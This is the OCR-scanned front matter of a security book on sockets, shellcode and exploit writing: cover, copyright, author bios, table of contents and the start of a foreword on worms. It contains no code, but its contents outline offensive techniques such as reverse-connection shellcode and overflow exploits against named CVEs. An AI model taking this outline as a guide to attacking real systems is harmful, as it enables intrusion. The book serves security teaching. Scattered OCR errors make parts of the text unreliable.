S Y N t R E S S 
4 FREE BOOKLETS J4 
YOUR SOLUTIONS MEMBERSHIP 
/ 
/"/I 
Alt 
4 
FREE I 
E-BOOKLETS 
/ -
Sockets, 
Shellcode, 
Porting & Coding 
REVERSE ENGINEERING EXPLOITS AND TOOL 
CODING FOR SECORITY PROFESSIONALS 
Elite Programming Techniques Demystified 
• Port Public Exploits to Windows, Linux, UNIX, and Mac OS 
• Use Reverse Engineering to Perform Zero-Day Exploit Forensics 
• Implement a Previously Undocumented Nmap-Style Input Function 
James C. Foster 
with Mike Price 
FOREWORD 
BY STUART McCLURE 
LEAD AUTHOR OF HACKING EXPOSED 

Register for Free Membership to 
Over the last few years, Syngress has published many best-selling and 
critically acclaimed books, including Tom Shinder's Configuring ISA 
Server 2000, Brian Caswell and Jay Beale's Snort 2.1 Intrusion 
Detection, and Angela Orebaugh and Gilbert Ramirez's Ethereal 
Packet Sniffing. One of the reasons for the success of these books has 
been our unique solutions@syngress.com program. Through this 
site, we've been able to provide readers a real time extension to the 
printed book. 
As a registered owner of this book, you will qualify for free access to 
our members-only solutions@syngress.com program. Once you have 
registered, you will enjoy several benefits, including: 
• Four downloadable e-booklets on topics related to the book. 
Each booklet is approximately 20-30 pages in Adobe PDF 
format. They have been selected by our editors from other 
best-selling Syngress books as providing topic coverage that 
is directly related to the coverage in this book. 
• A comprehensive FAQ page that consolidates all of the key 
points of this book into an easy to search Web page, pro-
viding you with the concise, easy-to-access data you need to 
perform your job. 
• A "From the Author" Forum that allows the authors of this 
book to post timely updates and links to related sites, or 
additional topic coverage that may have been requested by 
readers. 
Just visit us at www.syngress.com/solutions and follow the simple 
registration process. You will need to have this book with you when 
you register. 
Thank you for giving us the opportunity to serve your needs. And be 
sure to let us know if there is anything else we can do to make your 
job easier. 
S Y N G R E S S * 

For Gabriel, 
You are my inspiration. 

S Y N 
Sockets, 
Shellcode, 
Porting & Coding
REVERSE ENGINEERING EXPLOITS AND TOOL 
CODING FOR SECDRITY PROFESSIONALS 
James C. Foster 
with Mike Price 
FOREWORD 
Y STUART McCLURE 
^m 
|IJJ.TJUi:f::I JF HACKINt 
MiWlffl 

Syngress Publishing, Inc., the author(s), and any person or firm involved in the writing, editing, or produc-
tion (collectively "Makers") of this book ("the Work") do not guarantee or warrant the results to be 
obtained from the Work. 
There is no guarantee of any kind, expressed or implied, regarding the Work or its contents. The Work is 
sold AS IS and WITHOUT WARRANTYYou may have other legal rights, which vary from state to 
state. 
In no event will Makers be liable to you for damages, including any loss of profits, lost savings, or other 
incidental or consequential damages arising out trom the Work or its contents. Hecause some states do not 
allow- the exclusion or limitation of liability for consequential or incidental damages, the above limitation 
may not apply to you. 
You should always use reasonable care, including backup and other appropriate precautions, when working 
with computers, networks, data, and files. 
Syngress Media®, Syngress®, "Career Advancement Through Skill Enhancement®," "Ask the Author 
UP I >ATK:U:," and''Hack Proofing®," are registered trademarks of Syngress Publishing, Inc. "Syngress: The 
Definition of a Serious Security Library"™, "Mission Critical™," and "The Only Way to Stop a Hacker is 
to Think Like One™" are trademarks of Syngress Publishing, Inc. Brands and product names mentioned 
in this book are trademarks or service marks of their respective companies. 
KEY 
SERIAL NUMBER 
001 
HJ1RTCV764 
002 
P09873D5FG 
003 
829KMBNJH2 
004 
HJSDC63994 
005 
CVPLQ6WQ23 
006 
VBP965T5T5 
007 
HJJJ863WD3E 
008 
2987GVTWMK 
009 
629MP5SDJT 
(Mi) 
IMWQ295T6T 
PUBLISHED BY 
Syngress Publishing, Inc. 
800 Hingham Street 
Rockland, MA 02370 
Sockets, Shellcode, Porting, and Coding: Reverse Engineering Exploits and Tool Coding for Security 
Professionals 
Copyright © 2005 by Syngress Publishing, Inc. All rights reserved. Printed in the United States of 
America. Except as permitted under the Copyright Act of 1976, no part of this publication may be repro-
duced or distributed in any form or by any means, or stored in a database or retrieval system, without the 
prior written permission of the publisher, with the exception that the program listings may be entered, 
stored, and executed in a computer system, but they may not be reproduced for publication. 
Printed in the United States of America 
1 
2 3 4 5 6 7 8 9 0 
ISBN: 1-597490-05-9 
Publisher: Andrew Williams 
Page Layout and Art: Patricia Lupien 
Acquisitions Editor: Gary Byrne 
Copy Editors: Judy Eby and Mike McGee 
Technical Editor: Graham Clark 
Indexer: Nara Wood 
Cover Designer: Michael K.avish 
Distributed by O'Reilly Media, Inc. in the United States and Canada. For information on rights and 
translations, contact Matt Pedersen, Director of Sales and Rights, at Syngress Publishing; email matt@syti-
gress,com or fax to 781-681-3585, 

Acknowledgments 
Syngress would like to acknowledge the following people for their kindness and sup-
port in making this book possible. 
Syngress books are now distributed in the United States and Canada by O'Reilly 
Media, Inc.The enthusiasm and work ethic at O'Reilly are incredible, and we would 
like to thank everyone there for their time and efforts to bring Syngress books to 
market: Tim O'Reilly, Laura Baldwin, Mark Brokering, Mike Leonard, Donna Selenko, 
Bonnie Sheehan, Cindy Davis, Grant Kikkert, Opol Matsutaro, Steve Hazelwood, Mark 
Wilson, Rick Brown, Leslie Becker,Jill Lothrop,Tim Hinton, Kyle Hart, Sara Winge, 
C.J. Rayhill, Peter Pardo, Leslie Crandell, Valerie Dow, Regina Aggio, Pascal Honscher, 
Preston Paull, Susan Thompson, Bruce Stewart, Laura Schmier, Sue Willing, Mark 
Jacobsen, Betsy Waliszewski, Dawn Mann, Kathryn Barrett, John Chodacki, Rob 
Bullington, and Aileen Berg. 
The incredibly hardworking team at Elsevier Science, including Jonathan Bunkell, Ian 
Seager, Duncan Enright, David Burton, Rosanna Ramacciotti, Robert Fairbrother, 
Miguel Sanchez, Klaus Benin, Emma Wyatt, Chris Hossack, Krista Leppiko, Marcel 
Koppes,Judy Chappell, Radek Jatiousek, and Chris Reinders for making certain that 
our vision remains worldwide in scope. 
David Buckland, Mane Chieng, Lucy Chong, Leslie Lim, Audrey Gan, Pang Ai Hua, 
Joseph Chan, and Sin Zuraidah Ahmad of STP Distributors for the enthusiasm with 
which they receive our books. 
David Scott, Tricia Wilden, Marilla Burgess, Annette Scott, Andrew SwafFer, Stephen 
O'Donoghue, Bee Lowe, Mark Langley, and Anyo Geddes ofWoodslane for distributing 
our books throughout Australia, New Zealand, Papua New Guinea, Fiji,Tonga, Solomon 
Islands, and the Cook Islands. 
V 

Author Acknowledgments 
Most importantly, I'd like to thank my family for continuously believing in me and my 
ambitious goals.You continue to support my endeavors and dreams. Mom, Dad, Steve, 
and Mamaw—to you all I am forever grateful. 
I'd like to thank everyone who helped contribute to this book, including Mike 
Price, Marshall Beddoe,Tony Bettini, Chad Curtis, Niels Heinen, Russ Miller, Blake 
Watts, Kevin Harriford.Tom Ferris, Dave Aitel, Erik Birkholtz, Sinan Eren, and Stuart 
McClure.You guys are awesome. Thanks! 
An additional, thank-you goes out to Computer Sciences Corporation for 
allowing this publication to take place. Reg Foulkes—you are still the man! Additional 
well-deserved thanks go out to Chris Steinbach, Jason Enwright, Ron Knode, Jennifer 
Schulze, and Mary Pratt. 
Last but certainly not least, I'd like to thank the Syngress Publishing team. Gary, 
thanks for the effort and long hours you put into the book. Amy, thanks for the work 
on this book as well as the others. Andrew, thanks for supporting me and continuing to 
work on such exciting projects. Keep up the outstanding work, Syngress. I look for-
ward to more exciting projects in the near future. 
vi 

James C. Foster, Fellow is the Deputy Director of Global 
Security Solution Development for Computer Sciences 
Corporation, where he is responsible for the vision and develop-
ment of physical, personnel, and data security solutions. Prior to 
CSC, Foster was the Director of Research and Development for 
Foundstone Inc. (acquired by McAfee) and was responsible for all 
aspects of product, consulting, and corporate R&D initiatives. Prior 
to joining Foundstone, Foster was an Executive Advisor and 
Research Scientist with Guardent Inc. (acquired by Verisign) and an 
adjunct author at Information Security magazine (acquired by 
TechTarget), subsequent to working as a Security Research 
Specialist for the Department of Defense. With his core competen-
cies residing in high-tech remote management, international expan-
sion, application security, protocol analysis, and search algorithm 
technology, Foster has conducted numerous code reviews for com-
mercial OS components, Win32 application assessments, and reviews 
on commercial-grade cryptography implementations. 
Foster is a seasoned speaker and has presented throughout North 
America at conferences, technology forums, security summits, and 
research symposiums with highlights at the Microsoft Security 
Summit, Black Hat USA, Black Hat Windows, MIT Wireless 
Research Forum, SANS, MilCon,TechGov, InfoSec World 2001, 
and the Thomson Security Conference. He also is commonly asked 
to comment on pertinent security issues and has been sited in 
USAToday, Information Security magazine, Baseline, Computerworld, 
Secure Computing, and the MIT Technologist. Foster holds an A.S., 
B.S., MBA and numerous technology and management certifications 
and has attended or conducted research at the Yale School of 
Business, Harvard University, the University of Maryland, and is cur-
rently a Fellow at University of Pennsylvania's Wharton School of 
Business. 
Vil 

Foster is also a well-published author with multiple commercial 
and educational papers. He has authored, contributed, or edited for 
major publications, including Snort 2.1 Intrusion Detection (Syngress 
Publishing, ISBN: 1-931836-04-3), Hacking Exposed, Fourth Edition, 
Anti-Hacker Toolkit, Second Edition, Advanced Intrusion Detection, 
Hacking the Code: ASP NET Web Application Security (Syngress, ISBN: 
1 -932266-65-8), Anti-Spam Toolkit, and Google Hacking for Penetration 
Techniques {Syngress, ISBN: 1-931836-36-1). 
Lead Contributing Author 
Michael Price is a Principal Research and Development Engineer 
for McAfee (previously Foundstone, Inc.) and a seasoned developer 
within the information security field. On the services side, Mike has 
conducted numerous security assessments, code reviews, training, 
software development, and research for government and private 
sector organizations. At Foundstone, Mike's responsibilities include 
vulnerability research, network and protocol research, software 
development, and code optimization. His core competencies include 
neUvork- and host-based security software development for BSD 
and Windows platforms. Prior to Foundstone, Mike was employed 
by SecureSoft Systems, where he was a security software develop-
ment engineer. Mike has written multiple security programs to 
include multiple cryptographic algorithm implementations, network 
sniffers, and host-based vulnerability scanners. 
viii 

Contributing Authors, 
Editors, and Coders 
Niels Heinen is a security researcher at a European security firm. He 
has done research in exploitation techniques and is specialized in 
writing position independent assembly code used for changing pro-
gram execution flows. His research is mainly focused on Intel systems; 
however, he's also experienced with MIPS, HPPA, and especially PIC 
processors. Niels enjoys writing his own polymorphic exploits. 
wardrivc scanners, and even OS fingerprint tools. He also has a day-
to-day job that involves in-depth analysis of security products. 
Marshall Beddoe is a Research Scientist at McAfee (previously 
Foundstone). He has conducted extensive research in passive net-
work mapping, remote promiscuous detection, OS fingerprinting, 
FreeBSD internals, and new exploitation techniques. Marshall has 
spoken at such security conferences as the Black Hat Briefings, 
Defcon, and Toorcon. 
Tony Bettini leads the McAfee Foundstone R & D team and has 
worked for other security firms, including Foundstone, Guardent, 
and Bindview. He specializes in Windows security and vulnerability 
detection; he also programs in Assembly, C, and various other lan-
guages. Tony has identified new vulnerabilities in PGP, ISS Scanner, 
Microsoft Windows XP, and Winamp. 
Chad Curtis, MCSD, is an Independent Consultant in Southern 
California. Chad was an R & D Engineer at Foundstone, where he 
headed the threat intelligence team and offering in addition to 
researching vulnerabilities. His core areas of expertise are in Win32 
network code development, vulnerability script development, and 
interface development. Chad was a network administrator for 
Computer America Training Centers. 

Russ Miller is a Senior Consultant at VeriSign, Inc. He has per-
formed numerous "Web application assessments and penetration tests 
for Fortune 100 clients, including top financial institutions. Russ's 
core competencies reside in general and application-layer security 
research, network design, social engineering, and secure program-
ming, including C, Java, and Lisp. 
Blake Watts is a Senior R&D engineer with McAfee Foundstone 
and has previously held research positions with companies such as 
Bindview, Guardent (acquired by Verisign), and Pen ta Safe (acquired 
by NetlQ). His primary area of expertise is Windows internals and 
vulnerability analysis, and he has published numerous advisories and 
papers on Windows security. 
Vincent Liu is a Security Specialist at a Fortune 100 company. He 
has previously worked as a consultant at the Ernst & Young 
Advanced Security Center and for the National Security Agency. 
His specialties include penetration testing, "Web application assess-
ments, and exploit development. Vincent has been involved with 
DARPA-funded security research and is a contributor to the 
Metasploit project. Vincent holds a degree in Computer Science and 
Engineering from the University of Pennsylvania. 
x 

Foreword Contributor 
Stuart McClure, CISSP, CNE, CCSE, is Senior Vice President of 
Bisk Management Product Development at McAfee, Inc., where he is 
responsible for driving product strategy and marketing for the McAfee 
Foundstone family of risk mitigation and management solutions. 
McAfee Foundstone helps companies save countless millions in rev-
enue and man-hours annually in recovering from hacker attacks, 
viruses, worms, and malware. Prior to his role at McAfee, Stuart was 
Founder, President and Chief Technology Officer of Foundstone, Inc., 
which was acquired by McAfee in October of 2004. 
Widely recognized for his extensive and in-depth knowledge of 
security products, Stuart is considered one of the industry's leading 
authorities in information security today. A well-published and 
acclaimed security visionary, Stuart brings over 15 years of technology 
and executive leadership to Foundstone with profound technical, 
operational, and financial experience. He leads both the product 
vision and strategy for Foundstone, as well as operational responsibili-
ties for all technology development, support, and implementation. 
Since he assumed this leadership position, Stuart has helped grow 
annual revenues over 100% every year since the company's inception 
in 1999. 
Prior to joining Foundstone, Stuart held a variety of leadership 
positions in security and IT management, with Ernst & Young's 
National Security ProfilingTeam, two years as an industry analyst with 
IiifoWorld'sTest Center, five years as Director of IT with both state and 
local California government, two years as owner of an IT consultancy, 
and two years in IT with University of Colorado, Boulder. 
Stuart holds a bachelor's degree in Psychology and Philosophy, 
with an emphasis in Computer Science Applications from the 
University of Colorado, Boulder. He later earned numerous certifi-
cations, including ISC2's CISSP, Novell's CNE, and Check Points 
CCSE. 


Contents 
Foreword 
xxvii 
Chapter 1 Security Coding 
1 
2 
3 
5 
5 
8 
Introduction 
C/C++ 
Language Characteristics 
C 
Security 
Hello, World! Example . . 
Data Types 
Flow Control 
C# 
Functions 
9 
Classes (C++ Only) 
10 
Case Study: Fourier Estimation 
12 
Fourier Estimation Code 
12 
14 
Language Characteristics . . 
Object Oriented . . . . 
Platform Independence 
Multithreading 
Security I 
15 
15 
16 
16 
16 
Advanced Features 
16 
Hello, World! • 
17 
Data Types . 
Flow Control 
Methods 
Classes 
I, , . . . 
GET HTTP Headers 
Business Case for Migrating to C# . 
Language Characteristics 
Object-Oriented 
Other Features 
Security ^ ^ V 
C#Ts Hello, World! 
.17 
.18 
.20 
.20 
.22 
.23 
.24 
.24 
.24 
.25 
.25 
.26 
XIII 

Data Types 
26 
Flow Control 
27 
Methods 
29 
Classes . - 
30 
C# Threading 
31 
Case Study: Command Line IP Address Parsing 
32 
Perl 
40 
Data Types 
41 
Operators 
42 
A Sample Perl Script 
45 
Analysis 
46 
Special Variables 
46 
Pattern Matching and Substitution 
47 
Regular Expression Modifiers 
48 
Canonical Perl Tools 
49 
I Am a Perl Coder! 
49 
Analysis 
50 
A Log Modification Utility 
50 
Execution 
53 
Analysis 
53 
Python 
55 
InlineEgg 
56 
Analysis 
57 
Analysis 
58 
Summary 
60 
Solutions Fast Track 
61 
Links to Sites 
62 
I:R'(.|iieiitly A^kcd Questions 
63 
Chapter 2 NASL Scripting 
65 
Introduction 
66 
History 
66 
Goals of NASL 
66 
Simplicity and Convenience 
67 
Modularity and Efficiency 
67 
Safety 
67 
NASL's Limitations 
67 
NASL Script Syntax 
68 
Comments 
68 
Variables 
68 
Operators 
70 
Control Structures 
74 
Writing NASL Scripts 
77 
Writing Personal-use Tools in NASL 
78 
Networking Functions 
78 
HTTP Functions 
78 
Packet Manipulation Functions 
78 

Contents 
xv 
Strini; Manipulation functions 
79 
Cryptographic Functions 
79 
The NASL Command Line Interpreter 
79 
Programming in the Nessus Framework 
.80 
Descriptive Functions 
80 
Case Study:The Canonical NASL Script 
82 
Porting to and from NASL 
86 
Logic Analysis 
86 
Identify Logic 
86 
Pseudo Code 
87 
Porting to NASL 
88 
Porting to NASL from C/C++ 
89 
Porting from NASL 
94 
Summary 
95 
Solutions FastTrack 
95 
Links to Sites 
,97 
Frequently Asked Questions 
97 
Chapter 3 BSD Sockets 
99 
Introduction 
100 
Introduction to BSD Sockets Programming 
100 
TCP Clients and Servers 
101 
Compilation 
102 
Example Execution 
102 
Analysis 
102 
Compilation 
105 
Analysis 
105 
Analysis 
106 
UDP Clients and Server 
107 
Compilation 
109 
Example Execution 
109 
Analysis 
109 
Compilation 
I l l 
Example Execution 
I l l 
Analysis 
I l l 
Compilation 
113 
Example Execution 
113 
Analysis 
113 
Compilation 
115 
Example Execution 
115 
Analysis 
115 
Socket Options 
116 
Analysis 
118 
Network Scanning with UDP Sockets 
118 
Compilation 
125 
Example Execution 
125 

Analysis 
125 
Network Scanning with TCP Sockets 
127 
Compilation 
136 
Example Execution 
. . 
136 
Analysis 
136 
Threading and Parallelism 
139 
Summary 
141 
Solutions Fast Track 
141 
Links to Sites 
143 
Frequently Asked Questions 
143 
Chapter 4 Windows Sockets (Winsock) 
145 
Introduction 
146 
Winsock Overview 
146 
Winsock 2.0 
148 
Linking through Visual Studio 6.0 
148 
Linking through Source Code 
148 
Analysis 
150 
Case Study: Using WinSock to Grab a Web Page 
153 
Analysis 
154 
Writing Client Applications 
154 
Analysis 
156 
Writing Server Applications 
158 
Analysis 
160 
Writing Exploit and Vulnerability Checking Programs 
161 
Analysis 
167 
Analysis 
168 
Summary 
169 
Solutions Fast Track 
170 
Frequently Asked Questions 
170 
Case Study: Using WinSock to Execute a Web Attack 
172 
Analysis 
173 
Case Study: Using Winsock to Execute a Remote Buffer 
Overflow 
174 
Analysis 
176 
Chapter 5 Java Sockets 
177 
Introduction 
178 
An Overview ofTCP/IP 
178 
TCP Clients 
179 
Compilation 
181 
Example Execution . 
181 
Analysis 
182 
IP Addresses and Hostname Resolution 
183 

Contents 
xvi 
Example Execution 
184 
Analysis 
184 
Example Execution 
185 
Analysis . 
. , . 
.185 
Text-Based Input/Output:The LineNumberReader Class 
186 
Compilation 
188 
Example Execution 
188 
Analysis 
189 
TCP Servers 
189 
Compilation 
192 
Example Execution 
192 
Analysis 
192 
Using a Web Browser to Connect to TCPServcrl 
193 
Handling Multiple Connections 
194 
Compilation 
200 
Example Execution 
200 
Analysis 
201 
WormCatcher 
204 
Compilation 
207 
Example Execution 
207 
Analysis 
208 
UDP Clients and Servers 
209 
Compilation 
213 
Example Execution 
214 
Analysis 
214 
Summary 
217 
Solutions Fast Track 
217 
Frequently Asked Questions 
218 
Chapter 6 Writing Portable Code 
221 
Introduction 
222 
UNIX and Microsoft Windows Porting Guide 
222 
Pre-compiler Directives 
222 
Using ifdefs 
223 
Determining the Operating System 
225 
Example Execution 
226 
Analysis 
226 
Byte Ordering 
226 
Example Execution 
227 
Analysis 
228 
Process Creation and Termination 
229 
exec 
229 
Example Execution 
229 
Analysis 
230 
Example Execution 
230 
Analysis 
230 
Example Execution 
,233 

Contents 
Analysis 
233 
fork 
234 
exit 
234 
Multithreading . . - . . 
- 
234 
Thread Creation 
234 
Example Execution 
235 
Analysis 
235 
Example Execution 
237 
Analysis 
237 
Thread Coordination 
237 
Example Execution 
239 
Analysis 
239 
Example Execution 
241 
Analysis 
241 
Signals 
242 
Analysis 
243 
Analysis 
244 
File Handling 
244 
Analysis 
245 
Analysis 
246 
Directory Handling 
247 
Analysis 
248 
Analysis 
249 
Analysis 
250 
Libraries 
250 
Dynamic Loading of Libraries 
252 
Analysis 
254 
Analysis 
255 
Daemon/Win32 Service Programming 
256 
Example Execution 
257 
Analysis 
258 
Analysis 
261 
Memory Management 
262 
Analysis 
263 
Command-line Argument Processing 
263 
Analysis 
264 
Analysis 
266 
Example Execution 
267 
Analysis 
268 
Integer Data Types 
267 
Analysis 
267 
Summary 
269 
Solutions Fast Track 
269 
Frequently Asked Questions 
269 

Contents 
xix 
Chapter 7 Portable Network Programming 
273 
Introduction 
274 
BSD Sockets and Winsock 
274 
Winsock Requirements 
274 
Analysis 
276 
Portable Components 
276 
Return Values 
276 
Analysis 
277 
Analysis 
277 
Analysis 
278 
Extended Error Information 
278 
Analysis 
280 
The API 
280 
Winsock 2.0 Extensions 
280 
readO, writeO 
280 
socket() 
280 
Analysis 
282 
connect-0 
282 
Analysis 
285 
bind() 
285 
Analysis 
287 
listenO 
287 
Analysis 
290 
acceptO 
290 
Analysis 
293 
selectQ 
293 
Analysis 
297 
sendQ, sendto() 
298 
Analysis 
301 
recv(), recvfrom{) 
301 
Analysis 
304 
CloseQ, Closesocket() 
305 
Analysis 
306 
setsockoptfj 
307 
Analysis 
309 
Ioctlfj, Ioctlsockct() 
309 
Analysis 
311 
Raw Sockets 
312 
API Overview 
312 
Header Files 
312 
IP(v4) Header File: 
313 
ICMP Header File: 
315 
UDP Header File: 
315 
TCP Header File (tcp.h): 
316 
Local IP Address Determination 
317 

User Supplied 
317 
Listing Interfaces 
318 
Example Execution 
321 
Analysis . . 
. . 
. . . 
322 
Pcap and WinPcap 
323 
Example Execution 
327 
Analysis 
328 
Summary 
329 
Solutions Fast Track 
32y 
Frequently Asked Questions 
330 
Chapter 8 Writing Shellcode I 
333 
Introduction 
334 
Overview of Shellcode 
334 
The Tools 
335 
The Assembly Programming Language 
335 
Windows vs UNIX Assembly 
339 
The Addressing Problem 
339 
Using the call and jmp Trick 
339 
Pushing the Arguments 
340 
The NULL Byte Problem 
341 
Implementing System Calls 
342 
System Call Numbers 
342 
System Call Arguments 
343 
System Call Return Values 
344 
Remote Shellcode 
345 
Port Binding Shellcode 
345 
Socket Descriptor Reuse Shellcode 
34(i 
Local Shellcode 
348 
execve Shellcode 
348 
setuid Shellcode 
349 
chroot Shellcode 
350 
Windows Shellcode 
354 
Summary 
359 
Solutions Fast Track 
360 
Links to Sites 
362 
Mailing Lists 
362 
Frequently Asked Questions 
363 
Chapter 9 Writing Shellcode II 
365 
Introduction 
366 
Shellcode Examples 
36(i 
The Write System Call 
368 
Analysis 
369 
Analysis 
371 
execve Shellcode 
372 
Analysis 
373 

Contents 
Analysis 
373 
Analysis 
375 
Analysis 
376 
Analysis . . 
. . . 
378 
Analysis 
379 
Execution 
380 
Port Binding Shellcode 
380 
Analysis 
381 
The socket System Call 
383 
Analysis 
383 
The bind System Call 
383 
The listen System Call 
384 
Analysis 
384 
The accept System Call 
385 
Analysis 
385 
The dup2 System Calls 
385 
Analysis 
385 
The execve System Call 
386 
Analysis 
386 
Analysis 
389 
Reverse Connection Shellcode 
391 
Analysis 
393 
Socket Reusing Shellcode 
394 
Analysis 
395 
Analysis 
395 
Reusing File Descriptors 
396 
Analysis 
396 
Analysis 
398 
Analysis 
399 
Analysis 
399 
Analysis 
400 
Analysis 
401 
Analysis 
402 
Encoding Shellcode 
402 
Analysis 
403 
Analysis 
405 
Execution Analysis 
407 
Reusing Program Variables 
407 
Open-Source Programs 
408 
Analysis 
409 
Closed-Source Programs 
409 
Execution Analysis 
410 
Analysis 
411 
OS-Spanning Shellcode 
411 
Analysis 
412 
Understanding Existing Shellcode 
412 

Analysis 
414 
Summary 
416 
Solutions Fast Track 
416 
Links to Sites 
418 
Mailing Lists 
418 
Frequently Asked Questions 
419 
Chapter 10 Writing Exploits I 
421 
Introduction 
422 
Targeting Vulnerabilities 
422 
Remote and Local Exploits 
, . .423 
Analysis 
424 
Format String Attacks 
424 
Format Strings 
424 
Analysis 
425 
Analysis 
425 
Fixing Format String Bugs 
426 
Case Study: xlockmore User-Supplied Format String Vulnerability 
CVE-2000-0763 
427 
Vulnerability Details 
427 
Exploitation Details 
427 
Analysis 
429 
TCP/IP Vulnerabilities 
429 
Race Conditions 
430 
File Race Conditions 
430 
Signal Race Conditions 
431 
Case Study: man Input Validation Error 
432 
Vulnerability Details 
432 
Summary 
435 
Solutions Fast Track 
435 
Links to Sites 
436 
Frequently Asked Questions 
437 
Chapter 11 Writing Exploits II 
439 
Introduction 
440 
Coding Sockets and Binding for Exploits 
440 
Client-Side Socket Programming 
441 
Analysis 
441 
Analysis 
442 
Server-Side Socket Programming 
442 
Analysis 
444 
Stack Overflow Exploits 
444 
Memory Organization 
444 
Stack Overflows 
446 
Finding Exploitable Stack Overflows in Open-Source Software 
449 
Case Study: X11R6 4.2 XLOCALEDIR Overflow 
450 
The Vulnerability 
450 

Contents 
xxii 
The Exploit 
452 
Conclusion 
454 
Finding Exploitable Stack Overflows in Closed-Source Software 
454 
Heap Corruption Exploits 
455 
Doug Lea Malloc 
456 
Analysis 
458 
Case Study: OpenSSL SSLv2 Malformed Client Key Remote Buffer 
Overflow Vulnerability CAN-2002-0656 
459 
The Vulnerability 
460 
Exploitation 
460 
The Complication 
461 
Improving the Exploit 
462 
Conclusion 
463 
Exploit Code for OpenSSL SSLv2 Malformed Client Key 
Remote Buffer Overflow 
463 
System V Malloc 
468 
Analysis 
470 
Analysis 
471 
Integer Bug Exploits 
472 
Integer Wrapping 
472 
Analysis 
473 
Analysis 
474 
Bypassing Size Checks 
475 
Analysis 
475 
Analysis 
476 
Other Integer Bugs 
476 
Case Study: OpenSSH Challenge Response Integer Overflow 
Vulnerability CVE-2002-0639 
477 
Vulnerability Details 
477 
Exploitation Details 
478 
Case Study: UW POP2 Buffer Overflow Vulnerability CVE-1999-0920 
480 
Vulnerability Details 
480 
Summary 
488 
Solutions Fast Track 
488 
Links to Sites 
489 
Frequently Asked Questions 
490 
Chapter 12 Writing Exploits III 
491 
Introduction 
492 
Using the Metasploit Framework 
492 
Exploit Development with Metasploit 
498 
Determining the Attack Vector 
499 
Finding the Offset 
499 
Selecting a Control Vector 
504 
Finding a Return Address 
509 
Using the Return Address 
513 

Contents 
Determining Bad Characters 
514 
Determining Space Limitations 
515 
Nop Sleds 
517 
Choosing a Payload and Encoder . 
. . . . .518 
Integrating Exploits into the Framework 
527 
Understanding the Framework 
527 
Analyzing an Existing Exploit Module 
528 
Overwriting Methods 
533 
Summary 
534 
Solutions Fast Track 
534 
Links to Sites 
535 
Frequently Asked Questions 
536 
Chapter 13 Writing Security Components 
539 
Introduction 
540 
COM 
540 
COM Objects 
540 
COM Interfaces 
541 
[Unknown 
541 
Calling Convention 
541 
The COM Runtime 
541 
COM Object Implementation 
542 
COM Registration 
543 
HKEY_CLASSES_ROOT\CLSID 
544 
HKEY_CLASSES_ROOT\CLSID\ 
{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 
544 
InprocServer32 
544 
LocalServer32 
544 
COM IN-PROCESS Server Implementation 
544 
DllGetClassObject 
545 
DllCanUnloadNow 
545 
DllRegisterServer 
545 
DllUnregisterServer 
545 
ATL 
546 
C++ Templates 
546 
ATL Client Technologies 
547 
Smart Pointers 
547 
Datatype Support 
548 
BSTR 
548 
VARIANT 
548 
ATL Server Technologies 
550 
Class Composition 
550 
Interface Definition Language 
553 
Class Registration 
556 
COM IN-PROCESS Server Implementation 
559 
The AtlModule Global Variable 
559 

Contents 
xxv 
DLL Exports 
560 
Module Entry Point 
561 
COM OUT-OF-PROCESS Server Implementation 
561 
Module Entry Point . . 
562 
ATI. Attributes 
563 
Module Attribute 
564 
Interface Attributes 
565 
Component Attribute 
566 
Adding COM Extensions to the RPCDump Tool 
567 
COM EXE Server Implementation 
568 
Analysis 
570 
Control Flow 
571 
Analysis 
572 
Application Integration Routines 
573 
Analysis 
574 
Tool Interface Definition 
575 
IRpcEnum 
576 
lEndpointCollection 
577 
lEndpoint 
578 
Component Classes 
578 
Analysis 
579 
Analysis 
580 
Analysis 
583 
Application Integration: COMSupport.h 
584 
Analysis 
585 
Application 
Integration: 
RPC 
Dump.C 
585 
Analysis 
585 
Analysis 
586 
Analysis 
586 
Analysis 
586 
Analysis 
587 
Analysis 
587 
Summary 
587 
Solutions Fast Track 
588 
Links to Sites 
588 
Frequently Asked Questions 
589 
Chapter 14 Creating a Web Security Tool 
593 
Introduction 
594 
Design 
594 
Attack Signature Format 
594 
Signatures 
595 
In-Dcpth Analysis 
595 
Sockets and Execution 
596 
Analysis 
603 
Parsing 
605 

Contents 
Analysis 
608 
Analysis 
614 
Header Files 
616 
Compilation 
- 
619 
Execution 
619 
The Usage Screen 
620 
Tool Output 
620 
Summary 
621 
Solutions Fast Track 
621 
Links to Sites 
622 
Frequendy Asked Questions 
622 
Appendix A Glossary 
625 
Appendix B Security Tool Compendium 
633 
Source Code Auditing 
633 
Shellcode Tools 
634 
Debuggers 
634 
Compilers 
634 
Hardware Simulators 
635 
Security Libraries 
636 
Vulnerability Analysis 
636 
Network Traffic Analysis 
637 
Packet Generation 
638 
Scanners 
638 
Appendix C Exploit Archives 
639 
Online Exploit Archives 
640 
Appendix D Syscall Reference 
641 
exit( int) 
642 
open( file, flags, mode ) 
642 
close( 
filed 
es 
crip 
tor 
) 
642 
read( filed esc rip tor, pointer to buffer, amount of bytes ) 642 
write( filedescriptor, pointer to buffer, amount of bytes) 
642 
exeeve( file, file + arguments, environment data ) 
642 
socketcall( callnumher, arguments ) 
642 
socket( domain, type, protocol ) 
643 
bind( file descriptor, soekaddr struct, size of arg 2 ) 
643 
listen ( file descriptor, number of connections allowed in queue ) 
643 
accept ( file descriptor, soekaddr struct, size of arg 2 ) 
643 
Appendix E Data Conversion Reference 
645 
Index 
653 

Foreword 
Zero Day to Doomsday? 
The security industry has evolved dramatically since the early days of com-
puting. The viruses, worms, and malware of the early years have been dwarfed 
by today's threats. And as it continues to evolve, the industry faces a pivotal 
turning point. Will this ever-increasing sophistication (the very sophistication 
that we as an industry have been forced to create) jeopardize our society, cul-
ture, and markets? 
Take a look at the data. If you research how long it took vulnerabilities to 
turn into worms in 1999, and compare this data with today's number, you'd 
find that a self-propagating worm is crafted 20 times faster today than in 
1999—from 280 days in 1999 to four days in 2004. These worms are easily 
crafted and indiscriminately launched today, and the knowledge needed to 
accomplish these attacks is diminishing to near zero. What this means is that 
more hackers are writing more attacks in a quicker time period than ever 
before. 
Our first taste of these new, more sophisticated worms came in the late '90s 
with worms like the "sadmind."This worm started out by attacking the RPC 
service native to the Solaris operating system, sadmind. Once compromised, the 
worm moved from Sun Solaris systems to Windows boxes, hacking them up in 
turn. We've also seen worms that have used multiple attack vectors, taking 
advantage of multiple techniques of attack on different services. And we've seen 
worms that have morphed themselves, making it incredibly difficult to detect 
and prevent them. These blended threats are what awaits us—-but not as indi-
vidual worms.Tomorrow's worms will combine all these aspects (multiplatform, 
